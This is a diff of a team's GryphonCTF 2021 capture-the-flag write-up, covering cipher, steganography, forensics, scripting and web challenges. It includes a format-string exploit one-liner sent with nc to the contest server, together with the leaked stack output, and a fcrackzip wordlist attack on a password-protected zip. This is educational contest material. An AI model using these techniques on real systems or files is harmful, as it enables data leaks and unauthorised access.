@@ -13,11 +13,11 @@ The CTF website looks damn good, the challenges wasn't really very technical, re
 
 ![Using CTF Note](./gryphonsctf_ctfnote.png)
 
-Anyways, enough introduction, let's get into the challenges. I was lazy to write some part, so bear with me lol, I will rewrite them next time.
+Anyway, enough introduction, let's get into the challenges. I was lazy to write some part, so bear with me lol, I will rewrite them next time.
 
 ### [Reverse] I am confusion
 
-Solved by Jun Yan
+Solved by [@ReecL](https://github.com/ReecL)
 
 Description: I found a computer with a running  program and a slip of paper next to it which reads:
 65-90
@@ -119,7 +119,7 @@ print(ltr)
 Description: We recently launched a new marketplace. Can you obtain the key?
 nc c1.2021.gryphonctf.com 9004
 
-The challenge is actually a simple [format string vulnerability](https://owasp.org/www-community/attacks/Format_string_attack). You are able to leak out the flag by sending format string parameter like %x, %p. Forgot endianness exists, hence did not solve the challenge lol.
+The challenge is actually a simple [format string vulnerability](https://owasp.org/www-community/attacks/Format_string_attack). You are able to leak out the flag in the stack by sending format string parameter like %x, %p. I forgot endianness exists, hence did not solve the challenge lol.
 
 ```bash
 python -c 'print("A" * 32 + "%p "*512)' | nc c1.2021.gryphonctf.com 9004
@@ -129,7 +129,7 @@ Successfully purchased the following:
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0x7f059b90c723 (nil) 0x7f059b83bf33 0x26 0x7f059b90bbe0 0x7230667b46544347 0x5f366e693774346d 0x7230706d695f3569 0x3930335f376e3437 0x7d3637353434 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x25207025207025 0x7ffdf71a8eb0 0xda4ff00ce91d3400 0x55d7cd5c8320 0x7f059b773d0a 0x7ffdf71a8eb8
 ```
 
-Apparently, in data netorking, network protocols like TCP, UPD, IPv4 and IPv6 are using Big endian order to transmit data. Since a computer usually store data in little endian format, you will need to convert values from big endian to little endian. You can use CyberChef swap endianess recipe, or use this website: [BIG ENDIAN⇔LITTLE ENDIAN CONVERTER](https://www.save-editor.com/tools/wse_hex.html).
+Apparently, in data networking, network protocols like TCP, UPD, IPv4 and IPv6 are using Big endian order to transmit data. Since a computer usually store data in little endian format, you will need to convert values from big endian to little endian. You can use CyberChef swap endianess recipe, or use this website: [BIG ENDIAN⇔LITTLE ENDIAN CONVERTER](https://www.save-editor.com/tools/wse_hex.html).
 
 Big Endian:
 0x7230667b46544347 0x5f366e693774346d 0x7230706d695f3569 0x3930335f376e3437 0x7d3637353434
@@ -151,13 +151,13 @@ Will write this next time.
 
 ### [Misc] A very white horse
 
-Solved by Gavin
+Solved by [Gavebean](https://github.com/Gavebean)
 
 Description: This is a completely normal white horse
 
 ![horse](./horse.jpg)
 
-We are provided with a image of a white horse, use [Forensically](https://29a.ch/photo-forensics/#level-sweep), a web-based set of tools for digital image foreniscs. By changing the contrast of certain brightness levels of the image provided, we can see some chracters on the horse body.
+We are provided with a image of a white horse, use [Forensically](https://29a.ch/photo-forensics/#level-sweep), a web-based set of tools for digital image forensics. By changing the contrast of certain brightness levels of the image provided, we can see some characters on the horse body.
 
 ![horse level sweep](./horse_levelsweep.png)
 
@@ -175,7 +175,7 @@ Flag: GCTF{M0rSe\_H0Rs3}
 
 ### [Misc] Crypto is fun
 
-Solved by Gavin
+Solved by [Gavebean](https://github.com/Gavebean)
 
 Description: Who doesn’t love crypto
 
@@ -274,7 +274,7 @@ Flag: GCTF{StuCk W3th y3W}
 
 ### [Misc] Repeat, repeat
 
-Solved by Ethan
+Solved by [@ethanlow](https://github.com/eatenlow)
 
 Description: Why does the word "repeAting" keep repeatiNg??
 
@@ -330,7 +330,7 @@ Solve: [73442465 DIVIDE 49951750]
 > You ran out of time or faced an error! Exiting Program Now.
 ```
 
-This is clearly a scripting challenge as there is a time limit to solve some mathletics equations within 5 seconds. We will use Python with PwnTools to achieve this task.
+This is clearly a scripting challenge as there is a time limit to solve some mathematics questions within 5 seconds. We will use Python with PwnTools to achieve this task.
 
 ```python
 #!/usr/bin/env python3
@@ -389,11 +389,11 @@ Flag: GCTF{scr1pt1ng\_1s\_c00l}
 Description: You seem to know your way around scripts! Let’s try something different!
 http://c1.2021.gryphonctf.com:9006/
 
-This challenge seem to be the slibing of the previous scripting challenge, Script kiddie. This time, we were provided a website with the mathletics question as an image. Once again, we can use Python and PyTesseract to do some Optical character recognition (OCR) magic to solve the challenge.
+This challenge seem to be the sibling of the previous scripting challenge, Script kiddie. This time, we were provided a website with the mathematics question as an image. Once again, we can use Python and PyTesseract to do some Optical character recognition (OCR) magic to solve the challenge.
 
 ![Script God](./script_god.png)
 
-This code below was inspried by https://blog.justins.in/cddc20/. I remember seeing this challenge in CDDC2020.
+This code below was inspired by https://blog.justins.in/cddc20/. I remember seeing this challenge in CDDC2020.
 
 ```python
 import requests
@@ -503,7 +503,7 @@ Flag: GCTF{1\_4m\_4\_sCr1pt\_m4st3r}
 
 ### [Misc] Can y0u f1nd the flag?
 
-Solved by Gavin
+Solved by [Gavebean](https://github.com/Gavebean)
 
 Description: I can’t find it, can you? The flag has no numbers in it and is in ALL CAPS.
 
@@ -647,7 +647,7 @@ We were given a image file of what looks to be like static.
 
 ![Static Part 1](./static_part1.png)
 
-We can use some steganography tools, like [Stegsolve](https://github.com/zardus/ctf-tools/blob/master/stegsolve/install) to find see whether we can find anything interesting. Honestly, sometimes wihtout given hints, you just have to keep trying different stego tools. Luckly for us, StegSolve seems to be the correct tool for the job. A hidden QR Code found at one of the pane of the image as seen in the figure below.
+We can use some steganography tools, like [Stegsolve](https://github.com/zardus/ctf-tools/blob/master/stegsolve/install) to find see whether we can find anything interesting. Honestly, sometimes without hints, you may have to just keep trying different Steganography tools. Luckily for us, StegSolve seems to be the correct tool for the job. A hidden QR Code found at one of the pane of the image as seen in the figure below.
 
 ![Static Part 2](./static_part2.png)
 
@@ -672,7 +672,7 @@ Flag: GCTF{h1dd3n\_5w1213d\_1m4935}
 
 ### [Forensic] Inbetween
 
-Solved by Ethan
+Solved by [@ethanlow](https://github.com/eatenlow)
 
 Description: There is a file in a file. Can you find it?
 
@@ -702,7 +702,7 @@ Flag: GCTF{k3ep\_0n\_s4iling}
 
 ### [Forensic] Find the mole in the crowd
 
-Solved by Ethan
+Solved by [@ethanlow](https://github.com/eatenlow)
 
 Description: Find the flag amongst the many "people" that are in it together.
 http://c1.2021.gryphonctf.com:9001/
@@ -710,19 +710,19 @@ http://c1.2021.gryphonctf.com:9001/
 Visiting the site, it says that the flag can be found here. Using inspect element, we can see that there are 2 commented out Google Drive links
 <img src="https://i.imgur.com/j6JHXRB.png" width="100%" alt="">
 
-Visiting both Google Drive links we will be able to download 2 different zip files. However, the 1st one is simply a diversion meant to waste your time. You may ignore it and download from the 2nd link
+Visiting both Google Drive links we will be able to download 2 different zip files. However, the 1st one is simply a diversion meant to waste your time. You may ignore it and download from the 2nd link.
 <img src="https://i.imgur.com/fdbL0W9.png" width="100%" alt="">
 
-Once the download is complete, simply extract the zip file and navigate through its subfolders. Clicking into the Demo.zip and then the Demo folder inside it. After which you will see the following
+Once the download is complete, simply extract the zip file and navigate through its subfolders. Clicking into the Demo.zip and then the Demo folder inside it. After which you will see the following:
 <img src="https://i.imgur.com/SUUsO4c.png" width="100%" alt="">
 
-Click into the New folder and the subsequent mISC folder. You will then see the following
+Click into the New folder and the subsequent mISC folder. You will then see the following:
 <img src="https://i.imgur.com/VT7bAHe.png" width="100%" alt="">
 
-Click into the New Text Document and you will see some Hexadecimal characters
+Click into the New Text Document and you will see some Hexadecimal characters.
 <img src="https://i.imgur.com/nvyqiYj.png" width="100%" alt="">
 
-Paste these characters into a hex to ASCII converter and you will obtain the flag
+Paste these characters into a Hex to ASCII converter and you will obtain the flag.
 <img src="https://i.imgur.com/BWCLp80.png" width="100%" alt="">
 
 Flag: GCTF{Im\_N0T\_G00D\_AT\_T1STH1N6}
@@ -733,7 +733,7 @@ Flag: GCTF{Im\_N0T\_G00D\_AT\_T1STH1N6}
 
 Description: My friend introduced me to a piece of music for me to listen to recently. However, there is something strange in the music. Can you determine what is happening in the music?
 
-The challenge comes with a mp3 file, put it into Sonic Visualizer and add a spectogram
+The challenge comes with a mp3 file, put it into Sonic Visualizer and add a spectrogram
 
 <img src="https://i.imgur.com/EjuivoK.png" width="100%" alt="">
 
@@ -743,8 +743,7 @@ You will see the following hex characters:
 Converting them to ASCII characters would give us the following:
 R0NURntzUGVDdHIwZ3JAbV9pc19jMDBsfQ
 
-
-Using a Base64 decoder, we will then obtain the flag:
+Looks to be encoded with Base64, by using a [Base64 decoder](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)&input=UjBOVVJudHpVR1ZEZEhJd1ozSkFiVjlwYzE5ak1EQnNmUQ), we will then obtain the flag.
 
 Flag: GCTF{sPeCtr0gr@m\_is\_c00l}
 
@@ -752,27 +751,29 @@ Flag: GCTF{sPeCtr0gr@m\_is\_c00l}
 
 ### [Forensic] Thirteen Doges
 
-Solved by Gavin
+Solved by [Gavebean](https://github.com/Gavebean)
 
-Download doge.jpg
+Description: Here's a pic of good ol' Doge. The one and only. Or is it?
 
-Here's a pic of good ol' Doge. The one and only. Or is it?
-
-Ensure to have a 7-zip or WinRAR extractor installed to be able to solve this problem
+We are provided with an image, doge.jpg.
 
 <img src="https://i.imgur.com/DR04qKz.jpeg" width="100%" alt="">
 
-Photo String Extraction -> https://29a.ch/photo-forensics/#strings
-// Multiple Images Hiddein in doge.jpg
+We can view the strings of the image, by viewing the strings, we can see that the file is embedded with multiple images as seen in the figure below.
 
-Cyber Chef -> Extract Files
-Download biggest file because why not
+![Thirteen Doges Part 1](./thirteen_doges_part1.png)
 
-Dog7.jpg has a different CRC32 value
+Afterwards, we can use [CyberChef Extract Files recipe](https://gchq.github.io/CyberChef/#recipe=Extract_Files(true,true,true,true,true,true,false,true)) to extract the other image or zipped file.
 
-String Extraction = TPGS{q0t3p01a}
+![Thirteen Doges Part 2](./thirteen_doges_part2.png)
 
-Caesar Cipher +13 = GCTF{d0g3c01n}
+My teammate opt to download biggest file because why not. Opening the zipped file with 7zip, we can see that dog7.jpg has a different CRC32 value.
+
+![Thirteen Doges Part 3](./thirteen_doges_part3.png)
+
+Once again, perform string extraction on dog7.jpg. We can see the following string: TPGS{q0t3p01a}
+
+By doing rotation cipher, ROT13, we get the flag.
 
 Flag: GCTF{d0g3c01n}
 
@@ -780,27 +781,36 @@ Flag: GCTF{d0g3c01n}
 
 ### [Forensic] I love streaming music
 
+Solved by [@ethanlow](https://github.com/eatenlow)
+
 Description: I lost my music files during one of my streams, can you help me find them?
 
-Open the PCAP file in Wireshark, click on Statistics -> Conversations
+In this challenge, we are given a packet capture file, we can start off by opening the PCAP file in WireShark. Afterwards, click on the Statistics tab then Conversations to view traffic between two specific endpoints.
+
 <img src="https://i.imgur.com/Js8UjWS.png" width="100%" alt="">
 
-Go to TCP  15 and sort by Bytes in descending order
+Go to TCP  15 and sort by Bytes in descending order.
+
 <img src="https://i.imgur.com/9GOpZwj.png" width="100%" alt="">
 
-Click on the last one and click Follow Stream. You will obtain the following Base64 code
+Click on the last one and click Follow Stream. You will obtain the following Base64 message.
+
 <img src="https://i.imgur.com/lUKXYLi.png" width="100%" alt="">
 
-Decoding it will give you a link
+Decoding it with a Base64 decoder will give you a link.
+
 <img src="https://i.imgur.com/eEmljoy.png" width="100%" alt="">
 
-Visiting the link then provides you with a Google Drive [link](https://drive.google.com/drive/folders/1WTl2_tIn1Kw4jDtu5ZatWsUYuCYDbmLF)
+Visiting the link then provides you with a Google Drive [link](https://drive.google.com/drive/folders/1WTl2_tIn1Kw4jDtu5ZatWsUYuCYDbmLF).
+
 <img src="https://i.imgur.com/FwNfF45.png" width="100%" alt="">
 
-Visiting the Google Drive link will show you 2 audio files available for download
+Next, visiting the Google Drive link will show you 2 audio files available for download.
+
 <img src="https://i.imgur.com/rMWfWnN.png" width="100%" alt="">
 
-Using Sonic Visualizer, spectrogram layer. The last part of the audio1.mp3 contains the flag
+Finally, by using Sonic Visualizer, and viewing the spectrogram layer. The last part of the audio1.mp3 contains the flag.
+
 <img src="https://i.imgur.com/06ymtGq.png" width="100%" alt="">
 
 The flag used was: GCTF{1-l0ve-m0rs3-c0d3}
@@ -809,27 +819,33 @@ The flag used was: GCTF{1-l0ve-m0rs3-c0d3}
 
 ### [Forensic] Sheeesh
 
-Solved by Ethan
+Solved by [@ethanlow](https://github.com/eatenlow)
 
 Description: This CTF is bussin' respectfully.
 
-Put the Sheesh.wav file into Sonic Visualizer and view it in a Spectrogram, an incomplete QR code can be seen
+We are given an audio file for this challenge. Put the Sheesh.wav file into Sonic Visualizer and view it in a Spectrogram, an incomplete QR code can be seen.
+
 <img src="https://i.imgur.com/46LILTB.png" width="100%" alt="">
 
-We can then attempt to reconstruct the QR code manually based on what we can see
-<img src="https://i.imgur.com/3OVotWn.png" width="100%" alt="">
+We can then attempt to reconstruct the QR code manually based on what we can see. There is a online web tool to do QR Code Analysis and Recovery. https://merricx.github.io/qrazybox/
+
+<p align="center">
+    <img src="https://i.imgur.com/3OVotWn.png" width="50%" height="50%" alt="">
+</p>
 
 From this QR code we will obtain the first half of the flag being: GCTF{Sh3e3e3e3e3e5h
 
-We must now put the Sheeesh.wav file into a metadata checker.
+For the second part of the flag, we must now put the Sheeesh.wav file into a metadata checker.
+
 <img src="https://i.imgur.com/rBkmvMN.png" width="100%" alt="">
 
-We can see that the Technician area seems to be a Base64 code. So we can put it into a decoder to see the results.
+We can see that the Technician area seems to be a Base64 code. So we can put it into a decoder to see the results. By decoding the Base64 message, we can the second part of the flag.
 
-From the decode, we get the following:
-<img src="https://i.imgur.com/QZ8PTk9.png" width="100%" alt="">
+<p align="center">
+    <img src="https://i.imgur.com/QZ8PTk9.png" width="50%" height="50%" alt="">
+</p>
 
-Appending that to the previous half of the flag we had obtained, we now get GCTF{Sh3e3e3e3e3e5h\_1nD33d} which is the flag
+Appending that to the previous half of the flag we had obtained, we now get GCTF{Sh3e3e3e3e3e5h\_1nD33d} which is the flag.
 
 Flag: GCTF{Sh3e3e3e3e3e5h\_1nD33d}
 
@@ -843,15 +859,15 @@ Flag: GCTF{Sh3e3e3e3e3e5h\_1nD33d}
 
 Description: This is a weird file, I wonder what it contains?
 
+In this challenge, we were given a file that seems to be encrypted. We can start by viewing the strings of the file to see if there is any interesting messages. Using [CyberChef Strings recipe](https://gchq.github.io/CyberChef/#recipe=Strings('Single%20byte',4,'Alphanumeric%20%2B%20punctuation%20(A)',false)), we can find a plaintext: 7keyisonethreethreeseveninnumbers.
+
 <img src="https://i.imgur.com/SD3a9ZE.png" width="100%" alt="">
 
-XOR Decrypt, jpeg file
-
-Decrypting with the key "1337" in hex with XOR, outputs a JPEG image.
+Judging by the challenge name, we can guess that the file is encrypted with a XOR Cipher. The key is "1337", by decrypting the file, it reveals that the file is an jpeg image.
 
 <img src="https://i.imgur.com/X9hmsbE.png" width="100%" alt="">
 
-Extracting files in the jpeg file
+Next, we can use BinWalk to extract more files embedded in the image file. After extracting files in the jpeg file, we can see many files as seen in the textbox below.
 
 ```bash
 binwalk -e flag.jpg
@@ -861,8 +877,10 @@ cd _flag.jpg.extracted/xkey_part2
 1537  4  7758  8320  8885  9448 .. .. 10000 flag.zip README script.py
 ```
 
+By printing the number files on the standard output, we can see the "flags". However, these aren't the real flags, they are just password for the next step. We can print out the other files.
+
 ```bash
-cat 0 1 2 3 4 5 10000
+$ cat 0 1 2 3 4 5 10000
 GCTF{F0r3n51cS_1s_n0T_h4rD_49619}
 GCTF{F0r3n51cS_1s_n0T_h4rD_97263}
 GCTF{F0r3n51cS_1s_n0T_h4rD_33100}
@@ -870,25 +888,23 @@ GCTF{F0r3n51cS_1s_n0T_h4rD_37418}
 GCTF{F0r3n51cS_1s_n0T_h4rD_65848}
 GCTF{F0r3n51cS_1s_n0T_h4rD_64153}
 GCTF{F0r3n51cS_1s_n0T_h4rD_711555}
-```
 
-```bash
 $ cat README
-cat script.py
-```
-> The password to this zip is in one of these files, can you find it? Here is the source code, I ran it and modified one of the files with the password.
+The password to this zip is in one of these files, can you find it? Here is the source code, I ran it and modified one of the files with the password.
 NOTE: This is not the flag, GCTF{..._password} is not the flag. If you run the script, \*THE FLAG WILL BE DELETED\*
 
+$ cat script.py
+```
 ```python
 import random
 x = 0
 while x < 10001:
         with open(str(x), 'w') as f:
             f.write("GCTF{F0r3n51cS_1s_n0T_h4rD_" + str(random.randint(100000,999999)) + "}")
-        x += 1 
+        x += 1
 ```
 
-A bit of scripting to get a wordlist to crack zip file
+By reading the README and script.py file, we can understand that the Python script was used to encrypt the zip file with a randomly generated number. We can do a bit of scripting to get a wordlist to crack zip file. For this task, I opt to use grep, but it would be better to use awk instead, but I was lazy to figure out the command.
 
 ```bash
 grep -i "[0-9]*}$" *  > wordlist.txt
@@ -896,47 +912,19 @@ grep -i "[0-9]*}$" *  > wordlist.txt
 
 <img src="https://i.imgur.com/AK8NsKx.png" width="100%" alt="">
 
+After getting the wordlist with all of the numbers in the text file, we can then use fcrackzip, to crack the zip file.
 
 ```bash
-fcrackzip -v -D -p wordlist.txt flag.zip
+fcrackzip -v -u -D -p wordlist.txt flag.zip
 
 found file 'part2.png', (size cp/uc  38989/ 40278, flags 9, chk 1d93)
-possible pw found: y0Uf0uNdTh3p@5sw0Rd! ()
-possible pw found: 690159 ()
-possible pw found: 397419 ()
-possible pw found: 247118 ()
-possible pw found: 818579 ()
-possible pw found: 880147 ()
-possible pw found: 866383 ()
-possible pw found: 114573 ()
-possible pw found: 104506 ()
-possible pw found: 514581 ()
-possible pw found: 913980 ()
-possible pw found: 929337 ()
-possible pw found: 827629 ()
-possible pw found: 107037 ()
-possible pw found: 808488 ()
-possible pw found: 247118 ()
-possible pw found: 306641 ()
-possible pw found: 815347 ()
-possible pw found: 760079 ()
-possible pw found: 434146 ()
-possible pw found: 352412 ()
-possible pw found: 223442 ()
-possible pw found: 275364 ()
-possible pw found: 269665 ()
-possible pw found: 905030 ()
-possible pw found: 122364 ()
-possible pw found: 124377 ()
-possible pw found: 713461 ()
-possible pw found: 494175 ()
-possible pw found: 905030 ()
+
+PASSWORD FOUND!!!!: pw == y0Uf0uNdTh3p@5sw0Rd!
 ```
 
-Extract the part2.png
+Finally, we can extract the the zip file and it contains a image file: part2.png, which is the second part of our flag.
 
 <img src="https://i.imgur.com/DKZLFzG.png" width="100%" alt="">
-
 
 Flag: GCTF{345Y\_f0ReNs1C5\_L0L}
 
@@ -960,20 +948,24 @@ Description: I found this string of text in the code of an old arcade game. Do y
 WW91ciBrZXlib2FyZCB3aWxsIGhlbHAgaW4gdGhlIG5leHQgc3RlcDolJCMkJCUkQCEhIyEjQCMkJCMkJCQkQCMhJSRAISUjJCMjISUjQCMkJEAhJSQjJCQhJSMlJCQjJEBAIyQjJCEkIUBAISEhJCMhJCNAIUAkJEAlJCUhJSRAQEAlJQ==
 ```
 
-Base64 Convert = `Your keyboard will help in the next step:%$#$$%$@!!#!#@#$$#$$$$@#!%$@!%#$##!%#@#$$@!%$#$$!%#%$$#$@@#$#$!$!@@!!!$#!$#@!@$$@%$%!%$@@@%%`
+Seems to be Base64 encoded, by decoding it, we get the following message:
 
-Convert to numbers = 54344542113132344344442315421534331532344215434415354434223434141221114314321244254515422255
+```Your keyboard will help in the next step:%$#$$%$@!!#!#@#$$#$$$$@#!%$@!%#$##!%#@#$$@!%$#$$!%#%$$#$@@#$#$!$!@@!!!$#!$#@!@$$@%$%!%$@@@%%
+```
 
-Used: https://www.dcode.fr/cipher-identifier to identify the cipher.
+As implied by the previous message, we can convert the symbols by replacing them with the corresponding number.
 
-https://www.dcode.fr/polybius-cipher
+```
+54344542113132344344442315421534331532344215434415354434223434141221114314321244254515422255
+```
 
-Decrypt
+This part got us stumped for a while. We used https://www.dcode.fr/cipher-identifier to identify the cipher and found out that this message is encrypted with [polybius-cipher](https://www.dcode.fr/polybius-cipher).
 
-Rotation cipher, shift left by 12
+After decrypting the message, we can see the following text message:
 
 YOURALMOSTTHEREONEMORESTEPTOGO ODBFASDMBTKUERGZ
 
+Finally apply Rotation cipher, shift left by 12 to obtain the flag.
 [Rot13 CyberChef Recipe](https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,false,-12)&input=WU9VUkFMTU9TVFRIRVJFT05FTU9SRVNURVBUT0dPIE9EQkZBU0RNQlRLVUVSR1o)
 
 MCIFOZACGHHVSFSCBSACFSGHSDHCUC CRPTOGRAPHYISFUN
@@ -984,9 +976,23 @@ Flag: GCTF{CRPTOGRAPHYISFUN}
 
 ### [Crypto] cIPheR
 
-Solved by Gavin
+Solved by [Gavebean](https://github.com/Gavebean)
 
 Description: easy multi step cipher
+
+```
+1.
+S0EYRxyBINGSUUPGQMYCHYFLVUXURLJBAZFTJVWGQEKBINGSUUPGQMYCHYFLVUXURLJBAZFTJVWFQEKBINGSUUPGQMYCHYFLVUXVRLJBAZFTJVWFQEKBINGTUUPGQMCCHYFLVUXURLJCAZFTJVWFQEKBIdGSUUPHQMYCHYFLVUXURLJBAZFTJVWFQEOBINGSUUPGQMYCHYFLVUXURLJBApFTJVWFQEKBINGSUUPGQMYCHYFMVUXURLNBAZFTJVWFQEKBINGSUUTGQMYCHYFLVUXURLJBAZJTJVWFQuKBINGSUUPGQMCCHYFLVUXURLJCAZFTJVAFQEKBINGSUUPHQMYCHYJLVUXURLJBAZFTJVWFQEKBINGSUkPGQMYCHYFLVUXURLJBAZFTJVWFQEKBINGSUUPGQMYCHYFMVUXURLJBAZFTJlWFQEKBINGSUUTGQMYCHYFLVUXURLJBAZJTJVWFQEKBINGTUUPGQMYCHYFLVkXURLJCAZFTJVW9
+
+2.
+svefg zrny bs gur qnl va pncf vf gur xrl gb guvf punyyratr
+```
+
+This challenge was split into two parts, we can decode the second part first with ROT13 to obtain the following message.
+
+first meal of the day in caps is the key to this challenge
+
+This probably meant the key is BREAKFAST, afterwhich we then use this key with Vigenere cipher.
 
 ```
 1. S0EYRxyBINGSUUPGQMYCHYFLVUXURLJBAZFTJVWGQEKBINGSUUPGQMYCHYFLVUXURLJBAZFTJVWFQEKBINGSUUPGQMYCHYFLVUXVRLJBAZFTJVWFQEKBINGTUUPGQMCCHYFLVUXURLJCAZFTJVWFQEKBIdGSUUPHQMYCHYFLVUXURLJBAZFTJVWFQEOBINGSUUPGQMYCHYFLVUXURLJBApFTJVWFQEKBINGSUUPGQMYCHYFMVUXURLNBAZFTJVWFQEKBINGSUUTGQMYCHYFLVUXURLJBAZJTJVWFQuKBINGSUUPGQMCCHYFLVUXURLJCAZFTJVAFQEKBINGSUUPHQMYCHYJLVUXURLJBAZFTJVWFQEKBINGSUkPGQMYCHYFLVUXURLJBAZFTJVWFQEKBINGSUUPGQMYCHYFMVUXURLJBAZFTJlWFQEKBINGSUUTGQMYCHYFLVUXURLJBAZJTJVWFQEKBINGTUUPGQMYCHYFLVkXURLJCAZFTJVW9
@@ -996,13 +1002,9 @@ Vigenere Decode (Key=BREAKFAST) = R0NURntBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFCQUFBQU
 Base64 = GCTF{AAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAABAAAABAAAAAAAAABAAAAAAAAABAAAABAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAABAAAABAAAAAAAAAAAAAABAAAAAAAAAAAAAABAAAABAAAAAAAAABAAAAAAAAABAAAABAAAAAAAAABAAAABAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAABAAAAAAAAABAAAAAAAAAAAAAABAAAAAAAAABAAAAAAAAABAAAABAAAAA}
 ```
 
-Bacon Cipher Decode = BACONISTOOSALTY
+CyberChef automatically decoded the message with the Bacon Cipher Decode, which gives us the flag, BACONISTOOSALTY.
 
 [Bacon Cipher CyberChef Recipe](https://gchq.github.io/CyberChef/#recipe=Bacon_Cipher_Decode('Standard%20(I%3DJ%20and%20U%3DV)','A/B',false)Bacon_Cipher_Decode('Standard%20(I%3DJ%20and%20U%3DV)','A/B',false)&input=QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQkFBQUFBQUFBQUFBQUFBQkFBQUFCQUFBQUFBQUFBQkFBQUFBQUFBQUJBQUFBQkFBQUFBQUFBQUFBQUFBQUFBQUFCQUFBQUFBQUFBQUFBQUFBQUFBQUJBQUFBQUFBQUFBQUFBQUFBQUFBQkFBQUFCQUFBQUFBQUFBQUFBQUFCQUFBQUFBQUFBQUFBQUFCQUFBQUJBQUFBQUFBQUFCQUFBQUFBQUFBQkFBQUFCQUFBQUFBQUFBQkFBQUFCQUFBQUFBQUFBQUFBQUFBQUFBQUJBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQkFBQUFBQUFBQUJBQUFBQUFBQUFCQUFBQUFBQUFBQUFBQUFCQUFBQUFBQUFBQkFBQUFBQUFBQUJBQUFBQkFBQUFB)
-
-2. svefg zrny bs gur qnl va pncf vf gur xrl gb guvf punyyratr
-
-first meal of the day in caps is the key to this challenge (caesar cipher +13)
 
 Flag: GCTF{BACONISTOOSALTY}
 
@@ -1010,19 +1012,20 @@ Flag: GCTF{BACONISTOOSALTY}
 
 ### [Crypto] Story of louis
 
-Solved by Gavin
+Solved by [Gavebean](https://github.com/Gavebean)
 
 Description: Have a look through the web and have fun discovering it!
 http://c1.2021.gryphonctf.com:9008/
 
-Inspect element
---> https://drive.google.com/drive/folders/13-FU59-OBpNdX5v5MOX1SlY6EtWpCAP_
+By doing Inspect element, we can see a Google Drive link: https://drive.google.com/drive/folders/13-FU59-OBpNdX5v5MOX1SlY6EtWpCAP_.
 
-3 Images
+The Google Drive contains three images.
+
 <img src="https://i.imgur.com/VqXuzMs.jpg" width="100%" alt="">
 <img src="https://i.imgur.com/byVIiDo.png" width="100%" alt="">
 <img src="https://i.imgur.com/sm2UNee.png" width="100%" alt="">
 
+```
 Congrats :) You are almost there!!!
 110110100100011110110100{111000101010101001010100011100_110000111010100000010100111000111000100010}
 some more in4 (can_be_hint) abt Louis:
@@ -1030,6 +1033,9 @@ some more in4 (can_be_hint) abt Louis:
 2. H1s f4v0ur1t3 numb63r w4s s1x.
 3. H3 l0v3d t0 4rr4ng3 h1s stuff fr0m th3 l3ft t0 th3 r1ght, th3 t0p t0 th3 b0tt0m
 Have funnn <3
+```
+
+Honestly, we guess the payload so we don't actually know how to solve this lol.
 
 Answer = GCTF{LOUIS_BRAILLE}
 
@@ -1037,15 +1043,15 @@ Answer = GCTF{LOUIS_BRAILLE}
 
 ### [Crypto] Dumplings with vinegar
 
-Solved by Gavin
+Solved by [Gavebean](https://github.com/Gavebean)
 
 Description: This is an easy challenge to go, try to discover what is behind the image and get the flag.
 
 <img src="https://i.imgur.com/X7paHf6.jpg" width="100%" alt="">
 
-Strings:
+We are given a image of some yummy dumpings, by viewing the strings, we can see the encoded flag and some messages.
 
-```plaintext=
+```plaintext
 Congrats :) You are almost there!!!
 2K7J{33HxHz7_z0_ten_pl01HNvt7_01H_epF_09sa}
 more hints: from the A to the Z then from the 1 to the 0,
@@ -1054,11 +1060,7 @@ And who knows it might be a key.
 Have funnn <3
 ```
 
-
-Vigenere Cipher Decode
-Alphabet = A to Z, 1 to 0
-Key = VINEGAR
-Result = GCTF{W31c0m3\_t0\_ctf\_ch4113ng3\_411\_th3\_63st}
+We can then apply Vigenere Cipher Decode, with alphabet = A to Z, 1 to 0 and the Key = VINEGAR, which will result in the flag = GCTF{W31c0m3\_t0\_ctf\_ch4113ng3\_411\_th3\_63st}.
 
 Flag: GCTF{W31c0m3\_t0\_ctf\_ch4113ng3\_411\_th3\_63st}
 
@@ -1074,22 +1076,24 @@ Flag: GCTF{W31c0m3\_t0\_ctf\_ch4113ng3\_411\_th3\_63st}
 
 ### [Web] Vincenzo
 
-Solved by Ethan
+Solved by [@ethanlow](https://github.com/eatenlow)
 
 Description: During a visit to his motherland, a Korean-Italian mafia lawyer gives a conglomerate a taste of its own medicine with a side of justice. Watch now!
 http://c1.2021.gryphonctf.com:9009/
 
-Inspect element
+A simple web challenge, we can start with an Inspect element to view if there are any commented text.
+
 <img src="https://i.imgur.com/UwM4MrA.png" width="100%" alt="">
 
-You will find a paragraph element there with GCTF and a link
+You will find a paragraph element there with GCTF and a link. Click on the link and you will be redirected to the following page:
 
-Click on the link and you will be redirected
 <img src="https://i.imgur.com/QzjvyIC.png" width="100%" alt="">
 
 On the new page, it tells you the flag is Song Joong Ki's Birthday. Inspect element again and you will see a hidden element which tells you the format to enter his birthday in.
 
-With that the flag is GCTF{19091985}
+Googling, Song Joong Ki's Birthday is 19 September 1985. Hence this flag is GCTF{19091985}.
+
+Flag: GCTF{19091985}
 
 <br/>
 
